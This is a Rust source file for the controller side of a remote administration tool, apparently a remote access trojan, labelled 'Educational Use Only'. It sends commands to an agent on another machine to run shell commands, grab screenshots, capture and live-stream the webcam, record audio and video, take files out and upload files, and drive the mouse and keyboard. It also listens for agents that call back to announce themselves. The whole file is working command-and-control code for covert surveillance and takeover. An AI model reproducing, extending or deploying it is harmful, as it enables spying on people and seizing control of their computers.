mod stream_viewer;

use anyhow::Result;
use base64::{Engine as _, engine::general_purpose};
use crossterm::{
    execute,
    style::{Color, Print, ResetColor, SetForegroundColor},
};
use serde::{Deserialize, Serialize};
use std::io::{self, Write};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener};

#[derive(Debug, Serialize, Deserialize)]
enum Command {
    Execute { command: String },
    Screenshot,
    SystemInfo,
    ListProcesses,
    Ping,
    Shutdown,
    FileList { path: String },
    TurnWebcam { duration_seconds: u64 },
    RecordVideo { duration_seconds: u64 },
    DownloadFile { path: String },
    UploadFile { path: String, data: String }, // NEW
    StartLiveStream { port: u16 },
    StopLiveStream,
    StartScreenStream { port: u16 },
    StopScreenStream,
    RecordAudio { duration_seconds: u64 },  // NEW
    StartAudioStream { port: u16 },         // NEW
    StopAudioStream,                        // NEW
    RecordAV { duration_seconds: u64 },    // NEW
    // KEEP these for remotedesktop:
    MoveMouse { x: i32, y: i32 },
    ClickMouse { button: String },
    TypeText { text: String },
    PressKey { key: String },
}

#[derive(Debug, Serialize, Deserialize)]
struct Response {
    success: bool,
    message: String,
    data: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
struct AgentInfo {
    r#type: String,
    ip: String,
    hostname: String,
    os: String,
    version: String,
}

// Update Controller struct to store connection info
struct Controller {
    reader: BufReader<tokio::net::tcp::OwnedReadHalf>,
    writer: tokio::net::tcp::OwnedWriteHalf,
    agent_addr: String,
    agent_ip: String,  // ADD: Store agent IP separately
}

impl Controller {
    async fn connect(addr: &str) -> Result<Self> {
        let socket = tokio::net::TcpStream::connect(addr).await?;
        let (reader, writer) = socket.into_split();
        
        // Extract IP from address (remove port)
        let agent_ip = addr.split(':').next().unwrap_or(addr).to_string();
        
        let mut controller = Self {
            reader: BufReader::new(reader),
            writer,
            agent_addr: addr.to_string(),
            agent_ip,
        };
        
        // Receive agent info immediately
        if let Ok(agent_info) = controller.receive_agent_info().await {
            print_colored("\n╔═══════════════════════════════════════════╗\n", Color::Green);
            print_colored("║  Agent Connected Successfully!            ║\n", Color::Green);
            print_colored("╠═══════════════════════════════════════════╣\n", Color::Green);
            print_colored(&format!("║  Agent IP:    {:28}║\n", agent_info.ip), Color::Cyan);
            print_colored(&format!("║  Hostname:    {:28}║\n", agent_info.hostname), Color::Cyan);
            print_colored(&format!("║  OS:          {:28}║\n", agent_info.os), Color::Cyan);
            print_colored(&format!("║  Version:     {:28}║\n", agent_info.version), Color::Cyan);
            print_colored("╚═══════════════════════════════════════════╝\n", Color::Green);
        }
        
        Ok(controller)
    }
    
    async fn receive_agent_info(&mut self) -> Result<AgentInfo> {
        let mut info_line = String::new();
        self.reader.read_line(&mut info_line).await?;
        
        let info: AgentInfo = serde_json::from_str(&info_line)?;
        Ok(info)
    }
    
    // ADD: Reconnect method
    async fn reconnect(&mut self) -> Result<()> {
        print_colored("\n🔄 Reconnecting to agent...\n", Color::Yellow);
        
        let socket = tokio::net::TcpStream::connect(&self.agent_addr).await?;
        let (reader, writer) = socket.into_split();
        
        self.reader = BufReader::new(reader);
        self.writer = writer;
        
        // Read agent info again
        let mut line = String::new();
        self.reader.read_line(&mut line).await?;
        
        if let Ok(info) = serde_json::from_str::<serde_json::Value>(&line) {
            if info["type"] == "agent_info" {
                print_colored("✓ Reconnected successfully!\n", Color::Green);
                return Ok(());
            }
        }
        
        Err(anyhow::anyhow!("Failed to verify agent after reconnect"))
    }
    
    async fn send_command(&mut self, command: Command) -> Result<Response> {
        // If send fails, try to reconnect
        let command_json = serde_json::to_string(&command)?;
        
        if let Err(_) = self.writer.write_all(command_json.as_bytes()).await {
            // Connection lost, try reconnect
            self.reconnect().await?;
            
            // Retry sending command
            self.writer.write_all(command_json.as_bytes()).await?;
        }
        
        self.writer.write_all(b"\n").await?;
        self.writer.flush().await?;
        
        // Read response with timeout
        let mut response_line = String::new();
        
        match tokio::time::timeout(
            tokio::time::Duration::from_secs(300),
            self.reader.read_line(&mut response_line)
        ).await {
            Ok(Ok(0)) => {
                // Connection closed by agent
                print_colored("⚠️  Connection lost. Attempting to reconnect...\n", Color::Yellow);
                self.reconnect().await?;
                
                // Retry the command
                let command_json = serde_json::to_string(&command)?;
                self.writer.write_all(command_json.as_bytes()).await?;
                self.writer.write_all(b"\n").await?;
                self.writer.flush().await?;
                
                response_line.clear();
                self.reader.read_line(&mut response_line).await?;
            }
            Ok(Ok(_)) => {
                // Successfully read response
            }
            Ok(Err(e)) => {
                return Err(anyhow::anyhow!("Read error: {}", e));
            }
            Err(_) => {
                return Err(anyhow::anyhow!("Command timeout (300s)"));
            }
        }
        
        let response: Response = serde_json::from_str(&response_line)?;
        Ok(response)
    }
}

fn print_colored(text: &str, color: Color) {
    let _ = execute!(
        io::stdout(),
        SetForegroundColor(color),
        Print(text),
        ResetColor
    );
}

fn print_banner() {
    println!("\n╔════════════════════════════════════════╗");
    println!("║   Remote Administration Controller     ║");
    println!("║   v2.0 - Remote Control Features       ║");
    println!("║        Educational Use Only            ║");
    println!("╚════════════════════════════════════════╝\n");
    println!("⚠️  WARNING: Remote control features enabled");
    println!("    Only use on authorized systems!\n");
}

fn print_menu() {
    print_colored("\n┌─ Available Commands ─────────────────┐\n", Color::Cyan);
    println!("│ === BASIC COMMANDS ===");
    println!("│ 1. ping        - Check if agent is alive");
    println!("│ 2. exec        - Execute a shell command");
    println!("│ 3. sysinfo     - Get system information");
    println!("│ 4. processes   - List running processes");
    println!("│ 5. screenshot  - Capture screenshot");
    println!("│ 6. filelist    - List files in directory");
    println!("│ 7. webcam      - Capture from webcam");
    println!("│ 8. recordvideo - Record video from webcam");
    println!("│ 9. download    - Download file from agent");
    println!("│ 10. upload     - Upload file to agent");
    println!("│ 11. recordaudio - Record audio from agent");
    println!("│");
    println!("│ === STREAMING ===");
    println!("│ 12. livestream    - Start live webcam stream");
    println!("│ 13. stopstream    - Stop webcam stream");
    println!("│ 14. screenstream  - Start screen monitoring");
    println!("│ 15. stopscreen    - Stop screen monitoring");
    println!("│ 16. remotedesktop - Full remote desktop control ⭐");
    println!("│");
    println!("│ === SYSTEM ===");
    println!("│ 17. shutdown   - Shutdown the agent");
    println!("│ 18. help       - Show this menu");
    println!("│ 19. quit       - Exit controller");
    print_colored("└──────────────────────────────────────┘\n", Color::Cyan);
}

async fn handle_response(response: Response, command_type: &str) {
    if response.success {
        print_colored(&format!("✓ {}\n", response.message), Color::Green);
        
        if let Some(data) = response.data {
            match command_type {
                "screenshot" | "webcam" => {
                    println!("\n[Image Data - Base64 Encoded]");
                    println!("Length: {} bytes", data.len());
                    
                    // Save to file
                    if let Ok(decoded) = general_purpose::STANDARD.decode(&data) {
                        let filename = if command_type == "webcam" {
                            "webcam.png"
                        } else {
                            "screenshot.png"
                        };
                        
                        if let Err(e) = std::fs::write(filename, decoded) {
                            print_colored(&format!("Failed to save image: {}\n", e), Color::Red);
                        } else {
                            print_colored(&format!("Image saved as '{}'\n", filename), Color::Green);
                        }
                    }
                }
                "download" => {
                    println!("\n[File Data - Base64 Encoded]");
                    println!("Length: {} bytes", data.len());
                    
                    // Decode and save file
                    if let Ok(decoded) = general_purpose::STANDARD.decode(&data) {
                        print!("Enter filename to save as: ");
                        io::stdout().flush().unwrap();
                        
                        let mut filename = String::new();
                        io::stdin().read_line(&mut filename).unwrap();
                        let filename = filename.trim();
                        
                        if filename.is_empty() {
                            print_colored("No filename provided. File not saved.\n", Color::Red);
                        } else {
                            if let Err(e) = std::fs::write(filename, decoded) {
                                print_colored(&format!("Failed to save file: {}\n", e), Color::Red);
                            } else {
                                print_colored(&format!("✓ File saved as '{}'\n", filename), Color::Green);
                            }
                        }
                    }
                }
                _ => {
                    println!("\n{}", "─".repeat(50));
                    println!("{}", data);
                    println!("{}\n", "─".repeat(50));
                }
            }
        }
    } else {
        print_colored(&format!("✗ Error: {}\n", response.message), Color::Red);
    }
}

async fn interactive_mode(mut controller: Controller) -> Result<()> {
    print_menu();
    
    loop {
        print_colored("\n> ", Color::Yellow);
        io::stdout().flush()?;
        
        let mut input = String::new();
        io::stdin().read_line(&mut input)?;
        let input = input.trim();
        
        if input.is_empty() {
            continue;
        }
        
        let parts: Vec<&str> = input.splitn(2, ' ').collect();
        let command = parts[0].to_lowercase();
        
        match command.as_str() {
            "quit" | "exit" | "q" | "19" => {
                print_colored("\nExiting controller...\n", Color::Yellow);
                
                // Stop any active streams gracefully
                print_colored("🛑 Stopping all active streams...\n", Color::Yellow);
                let _ = controller.send_command(Command::StopLiveStream).await;
                let _ = controller.send_command(Command::StopScreenStream).await;
                
                print_colored("✓ Controller shutdown complete. Goodbye!\n", Color::Green);
                
                // Return Ok(()) instead of Err() for clean exit
                return Ok(());
            }
            
            "help" | "?" | "18" => {
                print_menu();
            }
            
            "ping" | "1" => {
                let response = controller.send_command(Command::Ping).await?;
                handle_response(response, "ping").await;
            }
            
            "exec" | "2" => {
                if parts.len() < 2 {
                    print_colored("Usage: exec <command>\n", Color::Red);
                    continue;
                }
                
                let cmd = parts[1].to_string();
                println!("Executing: {}", cmd);
                let response = controller
                    .send_command(Command::Execute { command: cmd })
                    .await?;
                handle_response(response, "exec").await;
            }
            
            "sysinfo" | "3" => {
                println!("Requesting system information...");
                let response = controller.send_command(Command::SystemInfo).await?;
                handle_response(response, "sysinfo").await;
            }
            
            "processes" | "4" => {
                println!("Requesting process list...");
                let response = controller.send_command(Command::ListProcesses).await?;
                handle_response(response, "processes").await;
            }
            
            "screenshot" | "5" => {
                println!("Requesting screenshot...");
                let response = controller.send_command(Command::Screenshot).await?;
                handle_response(response, "screenshot").await;
            }
            
            "filelist" | "6" => {
                if parts.len() < 2 {
                    print_colored("Usage: filelist <path>\n", Color::Red);
                    println!("Examples:");
                    println!("  filelist /home/user");
                    println!("  filelist C:\\Users\\username");
                    println!("  filelist .");
                    continue;
                }
                
                let path = parts[1].to_string();
                println!("Requesting file list for: {}", path);
                let response = controller
                    .send_command(Command::FileList { path })
                    .await?;
                handle_response(response, "filelist").await;
            }
            
            "webcam" | "7" => {
                print!("Enter duration in seconds (default 3): ");
                io::stdout().flush()?;
                
                let mut duration_input = String::new();
                io::stdin().read_line(&mut duration_input)?;
                let duration_seconds = duration_input
                    .trim()
                    .parse::<u64>()
                    .unwrap_or(3);
                
                println!("Requesting webcam capture for {} seconds...", duration_seconds);
                let response = controller
                    .send_command(Command::TurnWebcam { duration_seconds })
                    .await?;
                handle_response(response, "webcam").await;
            }
            
            "recordvideo" | "8" => {
                // Check for ffmpeg before recording
                if !check_ffmpeg() {
                    print_colored("\n⚠️  WARNING: ffmpeg not found in PATH!\n", Color::Yellow);
                    println!("Video recording requires ffmpeg to create MP4 files.");
                    println!("\nOptions:");
                    println!("  1. Download ffmpeg: https://ffmpeg.org/download.html");
                    println!("  2. On Windows: winget install ffmpeg");
                    println!("  3. On Linux: sudo apt install ffmpeg");
                    println!("  4. On macOS: brew install ffmpeg");
                    println!("\nAfter installation, restart the controller.");
                    print!("\nContinue anyway and save frames only? (yes/no): ");
                    io::stdout().flush()?;
                    
                    let mut continue_input = String::new();
                    io::stdin().read_line(&mut continue_input)?;
                    
                    if !continue_input.trim().eq_ignore_ascii_case("yes") {
                        println!("Recording cancelled.");
                        continue;
                    }
                }
                
                print!("Enter recording duration in seconds (default 10): ");
                io::stdout().flush()?;
                
                let mut duration_input = String::new();
                io::stdin().read_line(&mut duration_input)?;
                let duration_seconds = duration_input
                    .trim()
                    .parse::<u64>()
                    .unwrap_or(10);
                
                println!("Recording video for {} seconds...", duration_seconds);
                print_colored("⏳ This may take a moment. Please wait...\n", Color::Yellow);
                
                let response = controller
                    .send_command(Command::RecordVideo { duration_seconds })
                    .await?;
                
                if response.success {
                    print_colored(&format!("✓ {}\n", response.message), Color::Green);
                    
                    if let Some(data) = response.data {
                        // Parse video data
                        match serde_json::from_str::<serde_json::Value>(&data) {
                            Ok(video_data) => {
                                let frame_count = video_data["frame_count"].as_u64().unwrap_or(0);
                                let fps = video_data["fps"].as_f64().unwrap_or(0.0);
                                
                                println!("\n[Video Data]");
                                println!("Frames: {}", frame_count);
                                println!("FPS: {:.1}", fps);
                                
                                print!("\nSave video? (yes/no): ");
                                io::stdout().flush()?;
                                
                                let mut save_input = String::new();
                                io::stdin().read_line(&mut save_input)?;
                                
                                if save_input.trim().eq_ignore_ascii_case("yes") {
                                    print!("Enter filename (without extension): ");
                                    io::stdout().flush()?;
                                    
                                    let mut filename = String::new();
                                    io::stdin().read_line(&mut filename)?;
                                    let filename = filename.trim();
                                    
                                    if filename.is_empty() {
                                        print_colored("No filename provided.\n", Color::Red);
                                    } else {
                                        // Save frames to individual files
                                        if let Some(frames) = video_data["frames"].as_array() {
                                            let folder = format!("{}_video", filename);
                                            std::fs::create_dir_all(&folder)?;
                                            
                                            print_colored(&format!("💾 Saving {} frames...\n", frames.len()), Color::Yellow);
                                            
                                            for (i, frame) in frames.iter().enumerate() {
                                                if let Some(frame_data) = frame.as_str() {
                                                    if let Ok(decoded) = general_purpose::STANDARD.decode(frame_data) {
                                                        let frame_path = format!("{}/frame_{:04}.jpg", folder, i);
                                                        std::fs::write(&frame_path, decoded)?;
                                                    }
                                                }
                                            }
                                            
                                            print_colored(&format!("✓ Frames saved to '{}/' ({} frames)\n", folder, frames.len()), Color::Green);
                                            
                                            // Try to find and use ffmpeg
                                            if let Some(ffmpeg_path) = find_ffmpeg() {
                                                print_colored("\n🎬 Creating video with ffmpeg...\n", Color::Cyan);
                                                
                                                let output_video = format!("{}.mp4", filename);
                                                let fps_rounded = fps.round() as u32;
                                                
                                                let ffmpeg_result = std::process::Command::new(&ffmpeg_path)
                                                    .args([
                                                        "-y", // Overwrite output file if exists
                                                        "-framerate", &fps_rounded.to_string(),
                                                        "-i", &format!("{}/frame_%04d.jpg", folder),
                                                        "-c:v", "libx264",
                                                        "-pix_fmt", "yuv420p",
                                                        "-preset", "medium",
                                                        "-movflags", "+faststart", // Better web playback
                                                        &output_video
                                                    ])
                                                    .output();
                                                
                                                match ffmpeg_result {
                                                    Ok(output) => {
                                                        if output.status.success() {
                                                            print_colored(&format!("✓ Video created successfully: '{}'\n", output_video), Color::Green);
                                                            println!("   FPS: {}", fps_rounded);
                                                            println!("   Codec: H.264");
                                                            
                                                            // Ask if user wants to delete frames folder
                                                            print!("\nDelete frame images? (yes/no): ");
                                                            io::stdout().flush()?;
                                                            
                                                            let mut delete_input = String::new();
                                                            io::stdin().read_line(&mut delete_input)?;
                                                            
                                                            if delete_input.trim().eq_ignore_ascii_case("yes") {
                                                                if std::fs::remove_dir_all(&folder).is_ok() {
                                                                    print_colored(&format!("✓ Deleted frames folder: '{}'\n", folder), Color::Green);
                                                                }
                                                            }
                                                        } else {
                                                            let stderr = String::from_utf8_lossy(&output.stderr);
                                                            print_colored(&format!("✗ ffmpeg error:\n{}\n", stderr), Color::Red);
                                                        }
                                                    }
                                                    Err(e) => {
                                                        print_colored(&format!("✗ Failed to run ffmpeg: {}\n", e), Color::Red);
                                                    }
                                                }
                                            } else {
                                                print_colored("\n⚠️  ffmpeg not found. Frames saved only.\n", Color::Yellow);
                                                println!("\nTo create video manually, install ffmpeg and run:");
                                                println!("  ffmpeg -framerate {} -i {}/frame_%04d.jpg -c:v libx264 {}.mp4", 
                                                    fps.round() as u32, folder, filename);
                                                
                                                // Create a batch file for easy conversion
                                                let batch_content = format!(
                                                    "@echo off\nffmpeg -framerate {} -i {}/frame_%%04d.jpg -c:v libx264 -pix_fmt yuv420p {}.mp4\npause",
                                                    fps.round() as u32, folder, filename
                                                );
                                                
                                                let batch_file = format!("create_{}_video.bat", filename);
                                                if std::fs::write(&batch_file, batch_content).is_ok() {
                                                    print_colored(&format!("✓ Created helper script: '{}'\n", batch_file), Color::Green);
                                                    println!("   Double-click this file after installing ffmpeg to create the video.");
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            Err(e) => print_colored(&format!("Failed to parse video data: {}\n", e), Color::Red)
                        }
                    }
                } else {
                    print_colored(&format!("✗ Error: {}\n", response.message), Color::Red);
                }
            }
            
            "download" | "9" => {
                if parts.len() < 2 {
                    print_colored("Usage: download <remote-path>\n", Color::Red);
                    println!("Examples:");
                    println!("  download C:\\Users\\username\\document.txt");
                    println!("  download C:\\Users\\username\\Documents  (downloads entire folder as ZIP)");
                    println!("  download /home/user/file.pdf");
                    continue;
                }
                
                let path = parts[1].to_string();
                println!("Requesting: {}", path);
                let response = controller
                    .send_command(Command::DownloadFile { path: path.clone() })
                    .await?;
                
                if response.success {
                    print_colored(&format!("✓ {}\n", response.message), Color::Green);
                    
                    if let Some(data) = response.data {
                        println!("\n[Data - Base64 Encoded]");
                        println!("Length: {} bytes", data.len());
                        
                        // Decode and save
                        if let Ok(decoded) = general_purpose::STANDARD.decode(&data) {
                            print!("Enter filename to save as: ");
                            io::stdout().flush()?;
                            
                            let mut filename = String::new();
                            io::stdin().read_line(&mut filename)?;
                            let mut filename = filename.trim().to_string();
                            
                            if filename.is_empty() {
                                print_colored("No filename provided. File not saved.\n", Color::Red);
                            } else {
                                // If response message mentions "Folder" or "zipped", suggest .zip extension
                                if response.message.contains("Folder") || response.message.contains("zipped") {
                                    if !filename.ends_with(".zip") {
                                        filename.push_str(".zip");
                                        println!("Adding .zip extension: {}", filename);
                                    }
                                }
                                
                                if let Err(e) = std::fs::write(&filename, decoded) {
                                    print_colored(&format!("Failed to save file: {}\n", e), Color::Red);
                                } else {
                                    print_colored(&format!("✓ Saved as '{}'\n", filename), Color::Green);
                                    
                                    if filename.ends_with(".zip") {
                                        println!("   This is a ZIP archive. Extract it to access the folder contents.");
                                    }
                                }
                            }
                        }
                    }
                } else {
                    print_colored(&format!("✗ Error: {}\n", response.message), Color::Red);
                }
            }
            
            "upload" | "10" => {
                print!("Enter local file path to upload: ");
                io::stdout().flush()?;
                
                let mut local_path = String::new();
                io::stdin().read_line(&mut local_path)?;
                let local_path = local_path.trim();
                
                if local_path.is_empty() {
                    print_colored("No file specified.\n", Color::Red);
                    continue;
                }
                
                if !std::path::Path::new(local_path).exists() {
                    print_colored(&format!("File not found: {}\n", local_path), Color::Red);
                    continue;
                }
                
                match std::fs::read(local_path) {
                    Ok(file_data) => {
                        print!("Enter destination path on agent (full path with filename): ");
                        io::stdout().flush()?;
                        
                        let mut remote_path = String::new();
                        io::stdin().read_line(&mut remote_path)?;
                        let remote_path = remote_path.trim().to_string();
                        
                        if remote_path.is_empty() {
                            print_colored("No destination specified.\n", Color::Red);
                            continue;
                        }
                        
                        println!("Encoding file ({} bytes)...", file_data.len());
                        let encoded = general_purpose::STANDARD.encode(&file_data);
                        
                        println!("Uploading to: {}", remote_path);
                        print_colored("⏳ This may take a moment for large files...\n", Color::Yellow);
                        
                        let response = controller
                            .send_command(Command::UploadFile { 
                                path: remote_path, 
                                data: encoded 
                            })
                            .await?;
                        
                        if response.success {
                            print_colored(&format!("✓ {}\n", response.message), Color::Green);
                        } else {
                            print_colored(&format!("✗ Error: {}\n", response.message), Color::Red);
                            if response.message.contains("Access is denied") {
                                println!("\n💡 Tip: Make sure the destination path includes the filename");
                                println!("   Example: C:\\Users\\sam\\Desktop\\myfile.png");
                                println!("   (Not just the folder path)");
                            }
                        }
                    }
                    Err(e) => {
                        print_colored(&format!("Failed to read file: {}\n", e), Color::Red);
                    }
                }
            }
            
            "recordaudio" | "11" => {
                print!("Enter recording duration in seconds (default 10): ");
                io::stdout().flush()?;
                
                let mut duration_input = String::new();
                io::stdin().read_line(&mut duration_input)?;
                let duration_seconds = duration_input.trim().parse::<u64>().unwrap_or(10);
                
                println!("Recording audio for {} seconds...", duration_seconds);
                print_colored("⏳ Please wait...\n", Color::Yellow);
                
                let response = controller
                    .send_command(Command::RecordAudio { duration_seconds })
                    .await?;
                
                if response.success {
                    print_colored(&format!("✓ {}\n", response.message), Color::Green);
                    
                    if let Some(data) = response.data {
                        if let Ok(decoded) = general_purpose::STANDARD.decode(&data) {
                            print!("Save as (e.g., recording.wav): ");
                            io::stdout().flush()?;
                            
                            let mut filename = String::new();
                            io::stdin().read_line(&mut filename)?;
                            let mut filename = filename.trim().to_string();
                            
                            if !filename.is_empty() {
                                if !filename.ends_with(".wav") {
                                    filename.push_str(".wav");
                                }
                                
                                if let Err(e) = std::fs::write(&filename, decoded) {
                                    print_colored(&format!("Failed to save: {}\n", e), Color::Red);
                                } else {
                                    print_colored(&format!("✓ Saved as '{}'\n", filename), Color::Green);
                                }
                            }
                        }
                    }
                } else {
                    print_colored(&format!("✗ {}\n", response.message), Color::Red);
                }
            }
            
            "livestream" | "12" => {
                println!("Starting live webcam stream...");
                
                print!("Enter WebSocket port (default 9001): ");
                io::stdout().flush()?;
                
                let mut port_input = String::new();
                io::stdin().read_line(&mut port_input)?;
                let port = port_input.trim().parse::<u16>().unwrap_or(9001);
                
                let response = controller
                    .send_command(Command::StartLiveStream { port })
                    .await?;
                
                if response.success {
                    print_colored(&format!("✓ {}\n", response.message), Color::Green);
                    
                    // Use stored agent IP - no need to ask again
                    let ws_url = format!("ws://{}:{}", controller.agent_ip, port);
                    
                    println!("\n🎥 Starting webcam stream viewer...");
                    println!("   Press ESC to stop\n");
                    
                    if let Err(e) = stream_viewer::start_stream_viewer(&ws_url).await {
                        print_colored(&format!("Stream error: {}\n", e), Color::Red);
                    }
                } else {
                    print_colored(&format!("✗ {}\n", response.message), Color::Red);
                }
            }
            
            "stopstream" | "13" => {
                println!("Stopping webcam stream...");
                let response = controller.send_command(Command::StopLiveStream).await?;
                handle_response(response, "stopstream").await;
            }
            
            "screenstream" | "14" => {
                println!("Starting screen monitoring...");
                
                print!("Enter WebSocket port (default 9002): ");
                io::stdout().flush()?;
                
                let mut port_input = String::new();
                io::stdin().read_line(&mut port_input)?;
                let port = port_input.trim().parse::<u16>().unwrap_or(9002);
                
                let response = controller
                    .send_command(Command::StartScreenStream { port })
                    .await?;
                
                if response.success {
                    print_colored(&format!("✓ {}\n", response.message), Color::Green);
                    
                    // Use stored agent IP - no need to ask again
                    let ws_url = format!("ws://{}:{}", controller.agent_ip, port);
                    
                    println!("\nStarting screen monitor viewer...");
                    println!("Press ESC to stop");
                    
                    if let Err(e) = stream_viewer::start_stream_viewer(&ws_url).await {
                        print_colored(&format!("Stream error: {}\n", e), Color::Red);
                    }
                } else {
                    print_colored(&format!("✗ {}\n", response.message), Color::Red);
                }
            }
            
            "stopscreen" | "15" => {
                println!("Stopping screen monitoring...");
                let response = controller.send_command(Command::StopScreenStream).await?;
                handle_response(response, "stopscreen").await;
            }
            
            "remotedesktop" | "16" => {
                println!("Starting Remote Desktop Control...");
                
                print!("Enter WebSocket port (default 9002): ");
                io::stdout().flush()?;
                
                let mut port_input = String::new();
                io::stdin().read_line(&mut port_input)?;
                let port = port_input.trim().parse::<u16>().unwrap_or(9002);
                
                let response = controller
                    .send_command(Command::StartScreenStream { port })
                    .await?;
                
                if response.success {
                    print_colored(&format!("✓ {}\n", response.message), Color::Green);
                    
                    // Clone agent_ip to avoid borrow conflict
                    let agent_ip = controller.agent_ip.clone();
                    let ws_url = format!("ws://{}:{}", agent_ip, port);
                    
                    print_colored("\n🖥️ Remote Desktop Control Active!\n", Color::Green);
                    println!("   • Screen: Live view of agent's desktop");
                    println!("   • Mouse: Click in window to control agent");
                    println!("   • Keyboard: Type to send keystrokes to agent");
                    println!("   • Press ESC to exit\n");
                    
                    if let Err(e) = stream_viewer::start_remote_desktop(&ws_url, &agent_ip, &mut controller).await {
                        print_colored(&format!("Remote desktop error: {}\n", e), Color::Red);
                    }
                    
                    let _ = controller.send_command(Command::StopScreenStream).await;
                } else {
                    print_colored(&format!("✗ {}\n", response.message), Color::Red);
                }
            }
            
            "shutdown" | "17" => {
                println!("\n⚠️  WARNING: This will shutdown the agent!");
                print!("Are you sure? (yes/no): ");
                io::stdout().flush()?;
                
                let mut confirm = String::new();
                io::stdin().read_line(&mut confirm)?;
                
                if confirm.trim().eq_ignore_ascii_case("yes") {
                    let response = controller.send_command(Command::Shutdown).await?;
                    print_colored(&format!("✓ {}\n", response.message), Color::Green);
                    println!("Agent will shutdown. Disconnecting...");
                    break;
                } else {
                    println!("Shutdown cancelled.");
                }
            }
            
            _ => {
                print_colored(&format!("Unknown command: '{}'. Type 'help' for available commands.\n", input), Color::Red);
            }
        }
    }
    
    Ok(())
}

async fn listen_for_announcements(port: u16) -> Result<Option<String>> {
    let addr = format!("0.0.0.0:{}", port);
    let listener = TcpListener::bind(&addr).await?;
    
    println!("Listening on {}...", addr);
    println!("Waiting for agent announcements...\n");
    
    loop {
        match listener.accept().await {
            Ok((socket, addr)) => {
                println!("Connection from: {}", addr);
                
                let mut buf = String::new();
                let mut reader = BufReader::new(socket);
                
                // Read the announcement
                if let Ok(_) = reader.read_line(&mut buf).await {
                    if let Ok(info) = serde_json::from_str::<serde_json::Value>(&buf) {
                        if info["type"] == "agent_announcement" {
                            let agent_ip = info["ip"].as_str().unwrap_or("unknown");
                            print_colored("\n📢 Agent announced!\n", Color::Green);
                            println!("   IP: {}", agent_ip);
                            println!("   Hostname: {}", info["hostname"].as_str().unwrap_or("unknown"));
                            println!("   OS: {}", info["os"].as_str().unwrap_or("unknown"));
                            
                            // Return the agent's actual address (port 7878 where it's listening)
                            return Ok(Some(format!("{}:7878", agent_ip)));
                        }
                    }
                }
                
                println!("Invalid announcement format, waiting for next...");
            }
            Err(e) => eprintln!("Error accepting connection: {}", e),
        }
    }
}

// Helper function to check if ffmpeg is available
fn check_ffmpeg() -> bool {
    std::process::Command::new("ffmpeg")
        .arg("-version")
        .output()
        .is_ok()
}

// Helper function to try common ffmpeg locations
fn find_ffmpeg() -> Option<String> {
    let possible_paths = vec![
        "ffmpeg",
        "ffmpeg.exe",
        "./ffmpeg.exe",
        "./bin/ffmpeg.exe",
        "C:\\ffmpeg\\bin\\ffmpeg.exe",
        "C:\\Program Files\\ffmpeg\\bin\\ffmpeg.exe",
    ];
    
    for path in possible_paths {
        if std::process::Command::new(path)
            .arg("-version")
            .output()
            .is_ok()
        {
            return Some(path.to_string());
        }
    }
    None
}

#[tokio::main]
async fn main() -> Result<()> {
    print_banner();
    
    println!("⚠️  WARNING: This tool includes remote control features!");
    println!("    This tool should ONLY be used on systems you own or have");
    println!("    written authorization to access.");
    println!("    Unauthorized access to computer systems is illegal.\n");
    
    println!("╔═══════════════════════════════════════════╗");
    println!("║  Connection Mode Selection                ║");
    println!("╚═══════════════════════════════════════════╝");
    println!();
    println!("1. Connect to agent directly");
    println!("2. Listen for agent announcements");
    println!();
    print!("Select mode (1 or 2): ");
    io::stdout().flush()?;
    
    let mut mode = String::new();
    io::stdin().read_line(&mut mode)?;
    
    match mode.trim() {
        "2" => {
            println!("\n📡 Listening for agent announcements on port 9999...");
            
            if let Some(agent_addr) = listen_for_announcements(9999).await? {
                println!("\nConnecting to agent at {}...", agent_addr);
                match Controller::connect(&agent_addr).await {
                    Ok(controller) => {
                        interactive_mode(controller).await?;
                    }
                    Err(e) => {
                        print_colored(&format!("Failed to connect: {}\n", e), Color::Red);
                    }
                }
            }
        }
        _ => {
            // Direct connection
            print!("\nEnter agent address (IP:PORT, e.g., 192.168.1.100:7878): ");
            io::stdout().flush()?;
            
            let mut addr = String::new();
            io::stdin().read_line(&mut addr)?;
            let addr = addr.trim();
            
            println!("\nConnecting to agent at {}...", addr);
            
            match Controller::connect(addr).await {
                Ok(controller) => {
                    interactive_mode(controller).await?;
                }
                Err(e) => {
                    print_colored(&format!("Failed to connect: {}\n", e), Color::Red);
                    println!("\nMake sure:");
                    println!("  1. Agent is running");
                    println!("  2. IP address and port are correct");
                    println!("  3. No firewall blocking");
                }
            }
        }
    }
    
    Ok(())
}